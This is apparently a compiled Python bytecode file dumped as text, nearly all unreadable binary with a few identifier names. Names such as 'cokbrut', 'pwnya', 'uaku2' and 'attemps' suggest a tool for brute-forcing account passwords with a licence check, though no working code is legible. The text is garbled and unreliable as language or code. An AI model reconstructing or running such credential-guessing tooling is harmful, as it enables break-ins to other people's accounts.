   �mark�rich.columnsr   r�   �rprintr   �	rich.textr   �tekz�install�CONrM   r8  rD   �cokbrutr�   r�   �princprG   rH   r9  rA   rL   �	Exceptionr�   rB   rC   r�   �xdrO   �	randranger5  �c�d�f�gr4  r�   �jr�   rS   rE   rP   r3  �l�uaku2r6  �uakr�   r�   r7  r�   rC  rB  �oprekr�   �	lisensiku�	taplikasir�   r�   �lisensikunirX   rY   �imtrU  r.   r+   r&   r)   r    r3   r-   r,   r8   �sirr�   �hhr   �kkrL  �asu�pwpluss�pwnya�dic�dic2�now�day�tglrK   �month�bln�year�thnrD  �cpcr�   r�   r�   �attempsr�   r�   rU   r�   r�   r�   r�   r�   r�   r�   �__name__rY  rV   rW   rR   �<module>r�     s:
  �� 	�	�	�	� 8� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� 7� � � � � � � � � � � � � � � � � � � � � � � � � "� "� "� "� "� "� '� '� '� '� '� '� $� $� $� $� $� $� 9� 9� 9� 9� 9� 9� $� $� $� $� $� $� #� #� #� #� #� #� � � � � � � *� *� *� *� *� *� '� '� '� '� '� '�  �  �  �  �  �  � � � � � � � "� "� "� "� "� "� ��� � � ��C�E�E�� K�  M�� V�  X�� E�  G���  B�� M�  O������
���H�����	����x�|�K�L�L�Q����k�#�����T�"�"�"�"��� � � ���r�����������������	�T�+�c�����!�!�,�,�.�.��
�%��,�,� � �B�&���6��A�q�����6��A�q����
���6��C�����q���6��A�q�����6��A�q�����6��A�q�����6��A�q������
�1�Q�1�1��1�1�Q�1��1�1�1�a�1�1�!�1�1�a�1�1�!�1�1�a�1�1�����d���� =���6�=�1�1�1�2�2�����6�=�  S�  S�  S�  T�  T���6��A�s�����6�=�  S�  S�  S�  T�  T��5���6��B�s�������6��D������6��B�s������
�8�8�q�8�8�A�8�q�8�!�8�Q�8�8�!�8�Q�8�8��8�8�Q�8�8��8�8�Q�8�8�����U�����	��r��� 0� 0�A�'���6��C������6��C������6�=�  S�  S�  S�  T�  T���6�=�  S�  S�  S�  T�  T���6�=�  S�  S�  S�  T�  T���6�=�  S�  S�  S�  T�  T���6��A�q����I���6��A�q�����6��A�q���� f��	�/�1�/�/�q�/�!�/�Q�/��/�1�/�a�/��/�A�/�/��/�/�A�/�/���0� 0� 0� RT�TV�WX�YZ�[\�]_�`b�ce�fh�ik�ln�oq�rt�Qt� O��3�t�B�r�$�u�V�I�i���K�
��	� 	� 	���
�������������������������������������������f�m�Q�q��1�Q�K� � �� ��������G��&�U[�`h�mx�  H�  NX�  ^h�  i�  i���J�G��e�QW�]c�iq�  xC�  IR�  Xb�  hr�  s�  s��������!��	�3�3�x� �$�$�&�&�,�-�-�/��������"���C�C��H�H�n�S����S���!�#�%�c�c�#�h�h�.�v�5���C�C��H�H�n�S����S���!�#�%�c�c�#�h�h�.�v�5��S� S� S�R� R� R�� � �� � �
 �� 
��	�'� � � � 
��	�
L� M� M� M�� � �	� 	� 	�*� � �
a	� a	� a	�F.	� .	� .	�`� � �  �  �  �D6� 6� 6�p+	� +	� +	�X �Z����R�Y�z�������������R�Y�� � � � ��������A� A� A�* ������s0   �	4C> �>D�D�D�4U �U	�U �U!